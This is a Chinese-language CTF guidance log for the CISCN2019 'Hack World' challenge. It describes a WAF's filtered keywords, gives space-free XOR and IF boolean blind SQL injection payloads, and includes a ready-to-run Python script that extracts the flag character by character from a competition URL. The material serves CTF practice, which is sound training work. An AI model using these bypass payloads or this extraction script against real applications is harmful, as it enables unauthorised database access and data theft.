## [2026-07-28T23:05:00] Hack World -- CISCN2019 经典布尔盲注，绕过方案

这是 CISCN2019 华北赛区 Day2 Web1 "Hack World" 原题。搜到多个 writeup，绕过思路非常明确，供参考。

### WAF 过滤情况
- 被过滤: `and`, `or`, `union`, `select`(单独), 空格, `/**/`, `+`, `=`(部分场景)
- **未被过滤**: `^`(异或), `()`, `ascii`, `substr`, `if`, `from`, `flag`(表名列名直接给)

### 核心绕过技巧
1. 用 `()` 代替空格 -- 所有空格都用括号包裹替代
2. 用 `^`(XOR) 代替 `and`/`or` 做布尔判断
3. 不需要 union select，直接 `(select(flag)from(flag))` 子查询

### 响应区分 (布尔盲注)
- id=1 -> "Do you want to be my girlfriend?" (TRUE)
- id=2 -> 另一种正常响应
- 其他/错误 -> "Error Occured When Fetch Result." 或 bool(false)
- 用 "girlfriend" 关键词判断真假

### 方法一: XOR 布尔盲注 (推荐)
payload 结构 (无空格，全用括号):
```
0^(ascii(substr((select(flag)from(flag)),1,1))>80)
```
- 结果为真(1): 0^1=1 -> 页面返回 id=1 的内容 ("girlfriend")
- 结果为假(0): 0^0=0 -> 页面返回其他内容
- 用二分法快速定位每个字符的 ascii 值

### 方法二: IF 布尔盲注
```
if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)
```
- 条件真 -> 返回 id=1 内容
- 条件假 -> 返回 id=2 内容

### Python 二分盲注脚本 (可直接用)
```python
import requests

url = 'http://37f749d8f5e53e90a9692a4f.http-ctf2.dasctf.com/index.php'
flag = ''
for i in range(1, 60):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f'0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})'
        r = requests.post(url, data={'id': payload}, timeout=5)
        if 'girlfriend' in r.text:
            low = mid + 1
        else:
            high = mid
    flag += chr(low)
    print(f'[{i}] {flag}')
    if chr(low) == '}':
        break
print(f'FLAG: {flag}')
```

### 注意事项
- flag 格式为 UUID: `flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}`
- 请求间隔建议 0.1s 避免被限流
- 如果 XOR 被拦，试 IF 方案
- substr 的 start 从 1 开始

## [2026-07-28T23:19:00] 探测已确认 WAF，直接上 XOR 盲注脚本

你的探测结果已确认: `and`/`or`/`union`/空格 全被过滤("SQL Injection Checked.")，`1'` 返回 `bool(false)`(数字型注入，无引号闭合)。这些和上方 guidance 完全一致。

不要再试 and/or/union/报错/时间盲注了，这些路全堵死。直接用上面的 XOR 布尔盲注脚本跑。核心 payload 就一行:

```
0^(ascii(substr((select(flag)from(flag)),1,1))>80)
```

- 页面出现 "girlfriend" -> 条件为真
- 页面出现 "bool(false)" 或 "Error" -> 条件为假
- 二分法逐字符爆破，flag 大约 36-40 字符(UUID 格式)

上方 Python 脚本可直接 `python3` 运行，URL 已配好。跑完拿到 flag 立即提交。
